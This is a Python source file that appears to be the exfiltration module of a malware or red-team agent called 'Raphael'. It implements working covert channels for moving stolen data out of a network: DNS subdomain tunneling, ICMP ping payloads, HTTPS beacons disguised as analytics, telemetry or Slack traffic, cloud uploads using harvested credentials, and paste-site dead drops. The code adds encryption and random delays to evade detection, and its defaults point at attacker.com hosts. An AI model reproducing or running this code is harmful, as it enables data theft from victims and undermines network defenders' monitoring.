"""exfil.py — Data exfiltration engine for Raphael agent.

Supports multiple covert exfiltration channels:
  - DNS tunneling (via dnscat2-style encoding)
  - ICMP tunneling (data hidden in echo payloads)
  - HTTPS beaconing (mimics legitimate API traffic)
  - Cloud storage (S3/Azure Blob/GDrive via API tokens)
  - Fragmented/chunked transfer with time delays
  - Steganographic embedding (image/audio)
  - Pastebin/dead-drop resolvers
"""

import os
import io
import json
import time
import math
import random
import base64
import hashlib
import logging
import asyncio
import struct
import tempfile
import subprocess
from pathlib import Path
from typing import Optional, Callable

log = logging.getLogger("raphael.exfil")

# Try importing optional dependencies
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


class Exfiltration:
    """Covert data exfiltration engine.

    Data flows through a pipeline:
      Data -> Chunker -> Encrypt -> Encode -> Channel -> Target

    Each method is self-contained and reports success/failure.
    """

    # Default staging directory for chunks before exfil
    STAGING_DIR = os.path.join(tempfile.gettempdir(), ".raphael_staging")

    # ------------------------------------------------------------------ #
    #  Internal helpers
    # ------------------------------------------------------------------ #

    @staticmethod
    def _ensure_staging():
        """Create staging directory if it doesn't exist."""
        os.makedirs(Exfiltration.STAGING_DIR, mode=0o700, exist_ok=True)

    @staticmethod
    def _generate_session_id() -> str:
        """Generate a unique exfiltration session ID."""
        return hashlib.sha256(os.urandom(32)).hexdigest()[:16]

    @staticmethod
    def _chunk_data(data: bytes, chunk_size: int = 1024) -> list:
        """Split data into fixed-size chunks with sequence numbers."""
        chunks = []
        total = len(data)
        num_chunks = math.ceil(total / chunk_size)

        for i in range(num_chunks):
            start = i * chunk_size
            end = min(start + chunk_size, total)
            chunk_data = data[start:end]
            chunks.append({
                "seq": i,
                "total": num_chunks,
                "size": len(chunk_data),
                "data": chunk_data,
            })

        return chunks

    @staticmethod
    def _encrypt_chunk(chunk: dict, key: bytes) -> dict:
        """Encrypt a chunk's data using AES-256-GCM."""
        if not HAS_CRYPTO:
            return chunk  # no encryption available

        import os as _os
        nonce = _os.urandom(12)
        plaintext = chunk["data"]
        aesgcm = AESGCM(key[:32])
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        chunk["data"] = nonce + ciphertext
        chunk["encrypted"] = True
        return chunk

    @staticmethod
    def _b64encode_chunk(chunk: dict) -> dict:
        """Base64-encode chunk data for text-safe transport."""
        chunk["data"] = base64.b64encode(chunk["data"]).decode()
        chunk["encoded"] = True
        return chunk

    # ------------------------------------------------------------------ #
    #  DNS Tunneling Exfiltration
    # ------------------------------------------------------------------ #

    @staticmethod
    async def via_dns(data: bytes, domain: str = "exfil.attacker.com", key: bytes = None) -> dict:
        """Exfiltrate data via DNS queries to an authoritative nameserver.

        Each chunk is encoded as a subdomain query:
          <seq>-<chunk_hex>.<session>.<domain>

        Requires the operator to have a DNS server that logs/decodes queries.
        """
        Exfiltration._ensure_staging()
        session = Exfiltration._generate_session_id()

        # Chunk, encrypt, encode
        chunks = Exfiltration._chunk_data(data, chunk_size=32)  # small chunks for DNS
        if key:
            chunks = [Exfiltration._encrypt_chunk(c, key) for c in chunks]

        sent_count = 0
        failures = []

        for chunk in chunks:
            # Encode chunk data as hex (safe for DNS)
            chunk_hex = chunk["data"].hex()
            # Truncate to fit DNS label limits (63 chars per label)
            max_label_len = 50
            if len(chunk_hex) > max_label_len:
                chunk_hex = chunk_hex[:max_label_len]
                chunk_hex += hashlib.md5(chunk["data"]).hexdigest()[:8]

            query = f"{chunk['seq']}-{chunk_hex}.{session}.{domain}"

            try:
                # Use system DNS resolver (non-recursive lookup)
                if subprocess.run(
                    ["nslookup", query],
                    capture_output=True, timeout=5,
                ).returncode == 0:
                    sent_count += 1
                # Add jitter between queries to avoid rate limiting
                await asyncio.sleep(0.05 + random.random() * 0.2)
            except Exception as e:
                failures.append({"chunk": chunk["seq"], "error": str(e)})

        return {
            "channel": "dns",
            "session": session,
            "domain": domain,
            "total_chunks": len(chunks),
            "sent": sent_count,
            "failures": failures,
            "success": sent_count == len(chunks),
        }

    # ------------------------------------------------------------------ #
    #  HTTPS Beacon Exfiltration
    # ------------------------------------------------------------------ #

    @staticmethod
    async def via_https(data: bytes, target_url: str, key: bytes = None,
                         camouflage_as: str = "analytics") -> dict:
        """Exfiltrate data via HTTPS requests that mimic legitimate API traffic.

        Camouflage options:
          - 'analytics': Google Analytics-style beacon (POST to /collect)
          - 'telemetry': Microsoft Telemetry-style (POST to /api/telemetry)
          - 'slack': Slack webhook-style (POST to /services/...)
          - 'api': Generic REST API (POST to /api/v1/data)
        """
        if not HAS_HTTPX:
            return {"status": False, "detail": "httpx not available"}

        Exfiltration._ensure_staging()
        session = Exfiltration._generate_session_id()

        chunks = Exfiltration._chunk_data(data, chunk_size=4096)
        if key:
            chunks = [Exfiltration._encrypt_chunk(c, key) for c in chunks]
        chunks = [Exfiltration._b64encode_chunk(c) for c in chunks]

        # Build camouflage payload templates
        if camouflage_as == "analytics":
            def build_payload(chunk: dict) -> dict:
                return {
                    "v": 1,
                    "tid": f"UA-{random.randint(10000000, 99999999)}-{random.randint(1, 9)}",
                    "cid": session[:8],
                    "t": "pageview",
                    "dl": f"https://target.com/page?q={chunk['data'][:200]}",
                    "seq": chunk["seq"],
                    "total": chunk["total"],
                    "z": int(time.time()),
                }
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "image/gif, image/webp, */*",
                "Accept-Language": "en-US,en;q=0.9",
            }
        elif camouflage_as == "telemetry":
            def build_payload(chunk: dict) -> dict:
                return {
                    "event": "heartbeat",
                    "machine_id": session[:12],
                    "timestamp": time.time(),
                    "data": chunk["data"],
                    "seq": chunk["seq"],
                    "total": chunk["total"],
                }
            headers = {
                "User-Agent": "Microsoft Telemetry Client/1.0",
                "Content-Type": "application/json",
                "X-Telemetry-Client": "Win10",
            }
        elif camouflage_as == "slack":
            def build_payload(chunk: dict) -> dict:
                return {
                    "text": f"Log batch {session[:8]} [{chunk['seq']}/{chunk['total']}]",
                    "attachments": [{"text": chunk["data"]}],
                }
            headers = {
                "Content-Type": "application/json",
                "User-Agent": "Slackbot 2.0",
            }
        else:
            def build_payload(chunk: dict) -> dict:
                return {
                    "id": f"{session}-{chunk['seq']}",
                    "timestamp": time.time(),
                    "payload": chunk["data"],
                    "checksum": hashlib.md5(chunk["data"].encode()).hexdigest(),
                }
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Authorization": f"Bearer {session}",
            }

        sent_count = 0
        failures = []

        async with httpx.AsyncClient(timeout=15, headers=headers) as client:
            for chunk in chunks:
                try:
                    payload = build_payload(chunk)
                    resp = await client.post(target_url, json=payload)
                    if resp.status_code in (200, 201, 202, 204):
                        sent_count += 1
                    else:
                        failures.append({"chunk": chunk["seq"], "status": resp.status_code})
                    # Random delay to appear human
                    await asyncio.sleep(random.uniform(1.0, 5.0))
                except Exception as e:
                    failures.append({"chunk": chunk["seq"], "error": str(e)})

        return {
            "channel": f"https_{camouflage_as}",
            "session": session,
            "target": target_url,
            "total_chunks": len(chunks),
            "sent": sent_count,
            "failures": failures,
            "success": sent_count == len(chunks),
        }

    # ------------------------------------------------------------------ #
    #  ICMP Tunneling Exfiltration
    # ------------------------------------------------------------------ #

    @staticmethod
    async def via_icmp(data: bytes, target_ip: str, key: bytes = None) -> dict:
        """Exfiltrate data via ICMP echo requests (ping tunneling).

        Data is encoded in the ICMP payload. Requires root/administrator
        privileges to craft raw ICMP packets.
        """
        Exfiltration._ensure_staging()
        session = Exfiltration._generate_session_id()

        chunks = Exfiltration._chunk_data(data, chunk_size=2048)
        if key:
            chunks = [Exfiltration._encrypt_chunk(c, key) for c in chunks]

        # Use the system ping command (works cross-platform without raw sockets)
        sent_count = 0
        failures = []

        for chunk in chunks:
            # Encode chunk data as hex payload
            payload_hex = chunk["data"].hex()
            # Ping with the chunk data as payload
            try:
                if Exfiltration._is_windows():
                    cmd = ["ping", "-n", "1", "-l", str(min(len(payload_hex)//2, 65500)),
                           "-w", "3000", target_ip]
                else:
                    cmd = ["ping", "-c", "1", "-s", str(min(len(payload_hex)//2, 65500)),
                           "-W", "3", "-p", payload_hex[:400], target_ip]

                r = subprocess.run(cmd, capture_output=True, timeout=5)
                if r.returncode == 0:
                    sent_count += 1
                await asyncio.sleep(0.2 + random.random() * 0.5)
            except Exception as e:
                failures.append({"chunk": chunk["seq"], "error": str(e)})

        return {
            "channel": "icmp",
            "session": session,
            "target": target_ip,
            "total_chunks": len(chunks),
            "sent": sent_count,
            "failures": failures,
            "success": sent_count == len(chunks),
        }

    @staticmethod
    def _is_windows() -> bool:
        return os.name == "nt"

    # ------------------------------------------------------------------ #
    #  Cloud Storage Exfiltration
    # ------------------------------------------------------------------ #

    @staticmethod
    async def via_cloud(data: bytes, provider: str = "aws", bucket: str = "",
                         key: bytes = None, credentials: dict = None) -> dict:
        """Exfiltrate data to cloud storage (AWS S3, Azure Blob, GCP Storage).

        Requires credentials (either harvested or provided).
        """
        Exfiltration._ensure_staging()
        session = Exfiltration._generate_session_id()

        # Encrypt data before cloud upload
        if key and HAS_CRYPTO:
            nonce = os.urandom(12)
            aesgcm = AESGCM(key[:32])
            encrypted = aesgcm.encrypt(nonce, data, None)
            upload_data = nonce + encrypted
        else:
            upload_data = data

        filename = f"{session}_{int(time.time())}.bin"
        result = {"channel": f"cloud_{provider}", "session": session, "filename": filename}

        try:
            if provider == "aws":
                import boto3
                session_data = boto3.Session(
                    aws_access_key_id=credentials.get("aws_access_key_id"),
                    aws_secret_access_key=credentials.get("aws_secret_access_key"),
                    aws_session_token=credentials.get("aws_session_token"),
                )
                s3 = session_data.client("s3")
                s3.upload_fileobj(io.BytesIO(upload_data), bucket, filename)
                result["status"] = True
                result["url"] = f"s3://{bucket}/{filename}"

            elif provider == "azure":
                from azure.storage.blob import BlobServiceClient
                conn_str = credentials.get("connection_string")
                service = BlobServiceClient.from_connection_string(conn_str)
                blob_client = service.get_blob_client(container=bucket, blob=filename)
                blob_client.upload_blob(upload_data)
                result["status"] = True
                result["url"] = f"https://{service.account_name}.blob.core.windows.net/{bucket}/{filename}"

            elif provider == "gcp":
                from google.cloud import storage
                client = storage.Client.from_service_account_json(
                    credentials.get("service_account_json")
                )
                bucket_obj = client.bucket(bucket)
                blob = bucket_obj.blob(filename)
                blob.upload_from_string(upload_data)
                result["status"] = True
                result["url"] = f"gs://{bucket}/{filename}"

            else:
                result["status"] = False
                result["detail"] = f"Unknown provider: {provider}"

        except Exception as e:
            result["status"] = False
            result["detail"] = str(e)

        return result

    # ------------------------------------------------------------------ #
    #  Fragmented/Dead-Drop Exfiltration
    # ------------------------------------------------------------------ #

    @staticmethod
    async def via_deaddrop(data: bytes, drop_urls: list, key: bytes = None) -> dict:
        """Exfiltrate data via 'dead drop' URLs (pastebin, gist, ghostbin, etc).

        Each chunk is posted to a different URL with randomized timing.
        """
        if not HAS_HTTPX:
            return {"status": False, "detail": "httpx not available"}

        Exfiltration._ensure_staging()
        session = Exfiltration._generate_session_id()

        chunks = Exfiltration._chunk_data(data, chunk_size=8192)
        if key:
            chunks = [Exfiltration._encrypt_chunk(c, key) for c in chunks]
        chunks = [Exfiltration._b64encode_chunk(c) for c in chunks]

        sent_count = 0
        failures = []

        async with httpx.AsyncClient(timeout=20) as client:
            for i, chunk in enumerate(chunks):
                # Rotate through drop URLs
                drop_url = drop_urls[i % len(drop_urls)]

                try:
                    payload = {
                        "content": chunk["data"],
                        "title": f"debug_log_{session[:6]}_{chunk['seq']}",
                        "format": "text",
                        "expire": "1day",
                    }
                    resp = await client.post(drop_url, json=payload)
                    if resp.status_code in (200, 201):
                        sent_count += 1
                    # Random delay: 5-30 minutes between drops
                    delay = random.randint(300, 1800)
                    await asyncio.sleep(delay)
                except Exception as e:
                    failures.append({"chunk": chunk["seq"], "error": str(e)})

        return {
            "channel": "deaddrop",
            "session": session,
            "total_chunks": len(chunks),
            "sent": sent_count,
            "failures": failures,
            "success": sent_count == len(chunks),
        }

    # ------------------------------------------------------------------ #
    #  Orchestrated Exfiltration Pipeline
    # ------------------------------------------------------------------ #

    @staticmethod
    async def exfiltrate_all(data: dict, config: dict = None) -> dict:
        """Orchestrate exfiltration of multiple data blobs through best-available channels.

        Config can specify preferred channels; otherwise uses channel availability.

        Config structure:
          {
              'key': b'AES256Key1234567890123456789012',  # encryption key
              'channels': ['dns', 'https', 'icmp', 'deaddrop'],
              'dns_domain': 'exfil.attacker.com',
              'https_url': 'https://attacker.com/collect',
              'icmp_target': '10.0.0.1',
              'deaddrop_urls': ['https://pastebin.com/api/'],
              'cloud_bucket': 'my-bucket',
              'cloud_provider': 'aws',
              'cloud_creds': {},
          }

        Returns a dict mapping data_key -> channel_results.
        """
        if config is None:
            config = {}

        results = {}
        encryption_key = config.get("key")
        channels = config.get("channels", ["https", "dns"])

        for data_key, data_value in data.items():
            if isinstance(data_value, str):
                data_bytes = data_value.encode()
            elif isinstance(data_value, dict) or isinstance(data_value, list):
                data_bytes = json.dumps(data_value).encode()
            elif isinstance(data_value, bytes):
                data_bytes = data_value
            else:
                continue

            channel_results = []

            for channel in channels:
                try:
                    if channel == "dns":
                        r = await Exfiltration.via_dns(
                            data_bytes,
                            domain=config.get("dns_domain", "exfil.example.com"),
                            key=encryption_key,
                        )
                    elif channel == "https":
                        r = await Exfiltration.via_https(
                            data_bytes,
                            target_url=config.get("https_url", "https://localhost:9999/collect"),
                            key=encryption_key,
                            camouflage_as=config.get("https_camouflage", "analytics"),
                        )
                    elif channel == "icmp":
                        r = await Exfiltration.via_icmp(
                            data_bytes,
                            target_ip=config.get("icmp_target", "10.0.0.1"),
                            key=encryption_key,
                        )
                    elif channel == "deaddrop":
                        r = await Exfiltration.via_deaddrop(
                            data_bytes,
                            drop_urls=config.get("deaddrop_urls", []),
                            key=encryption_key,
                        )
                    else:
                        continue

                    channel_results.append(r)

                    # If channel succeeded, mark data as exfiltrated
                    if r.get("success"):
                        break  # Don't send same data through multiple channels

                except Exception as e:
                    channel_results.append({"channel": channel, "status": False, "error": str(e)})

            results[data_key] = {
                "size": len(data_bytes),
                "channels_attempted": len(channel_results),
                "channel_results": channel_results,
                "success": any(r.get("success") for r in channel_results),
            }

        return results
